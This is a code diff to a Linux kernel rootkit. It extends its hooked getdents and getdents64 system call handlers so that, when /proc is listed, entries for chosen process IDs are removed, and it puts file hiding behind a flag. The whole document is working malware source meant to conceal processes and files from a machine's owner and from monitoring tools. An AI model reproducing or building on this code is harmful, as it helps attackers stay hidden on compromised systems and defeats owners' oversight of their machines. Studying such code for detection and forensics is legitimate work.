@@ -4,6 +4,7 @@
 #include <linux/xattr.h>
 #include <linux/fdtable.h>
 #include <linux/list.h>
+#include <linux/proc_ns.h>
 
 #include "common.h"
 #include "hook.h"
@@ -97,6 +98,7 @@ g7_getdents(const struct pt_regs *pt_regs)
 {
     typedef struct linux_dirent *dirent_t_ptr;
 
+    bool may_proc;
     unsigned long offset;
     dirent_t_ptr kdirent, cur_kdirent, prev_kdirent;
     struct dentry *kdirent_dentry;
@@ -115,24 +117,29 @@ g7_getdents(const struct pt_regs *pt_regs)
     atomic_inc(&getdents_count);
 
     kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
+    may_proc = rootkit.hiding_pids && kdirent_dentry->d_inode->i_ino == PROC_ROOT_INO;
 
     inode_list_t hidden_inodes = { 0, NULL };
     inode_list_t_ptr hi_head, hi_tail;
     hi_head = hi_tail = &hidden_inodes;
 
-    struct list_head *i;
-    list_for_each(i, &kdirent_dentry->d_subdirs) {
-        unsigned long inode;
-        struct dentry *child = list_entry(i, struct dentry, d_child);
+    if (rootkit.hiding_files) {
+        struct list_head *i;
+        list_for_each(i, &kdirent_dentry->d_subdirs) {
+            unsigned long inode;
+            struct dentry *child = list_entry(i, struct dentry, d_child);
 
-        if ((inode = must_hide_inode(child)))
-            hi_tail = add_inode_to_list(hi_tail, inode);
+            if ((inode = must_hide_inode(child)))
+                hi_tail = add_inode_to_list(hi_tail, inode);
+        }
     }
 
     for (offset = 0; offset < ret;) {
         cur_kdirent = (dirent_t_ptr)((char *)kdirent + offset);
 
-        if (list_contains_inode(hi_head, cur_kdirent->d_ino)) {
+        if ((may_proc && list_contains_pid(&hidden_pids, PID_FROM_NAME(cur_kdirent->d_name)))
+            || list_contains_inode(hi_head, cur_kdirent->d_ino))
+        {
             if (cur_kdirent == kdirent) {
                 ret -= cur_kdirent->d_reclen;
                 memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
@@ -161,6 +168,7 @@ g7_getdents64(const struct pt_regs *pt_regs)
 {
     typedef struct linux_dirent64 *dirent64_t_ptr;
 
+    bool may_proc;
     unsigned long offset;
     dirent64_t_ptr kdirent, cur_kdirent, prev_kdirent;
     struct dentry *kdirent_dentry;
@@ -179,24 +187,29 @@ g7_getdents64(const struct pt_regs *pt_regs)
     atomic_inc(&getdents64_count);
 
     kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
+    may_proc = rootkit.hiding_pids && kdirent_dentry->d_inode->i_ino == PROC_ROOT_INO;
 
     inode_list_t hidden_inodes = { 0, NULL };
     inode_list_t_ptr hi_head, hi_tail;
     hi_head = hi_tail = &hidden_inodes;
 
-    struct list_head *i;
-    list_for_each(i, &kdirent_dentry->d_subdirs) {
-        unsigned long inode;
-        struct dentry *child = list_entry(i, struct dentry, d_child);
+    if (rootkit.hiding_files) {
+        struct list_head *i;
+        list_for_each(i, &kdirent_dentry->d_subdirs) {
+            unsigned long inode;
+            struct dentry *child = list_entry(i, struct dentry, d_child);
 
-        if ((inode = must_hide_inode(child)))
-            hi_tail = add_inode_to_list(hi_tail, inode);
+            if ((inode = must_hide_inode(child)))
+                hi_tail = add_inode_to_list(hi_tail, inode);
+        }
     }
 
     for (offset = 0; offset < ret;) {
         cur_kdirent = (dirent64_t_ptr)((char *)kdirent + offset);
 
-        if (list_contains_inode(hi_head, cur_kdirent->d_ino)) {
+        if ((may_proc && list_contains_pid(&hidden_pids, PID_FROM_NAME(cur_kdirent->d_name)))
+            || list_contains_inode(hi_head, cur_kdirent->d_ino))
+        {
             if (cur_kdirent == kdirent) {
                 ret -= cur_kdirent->d_reclen;
                 memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
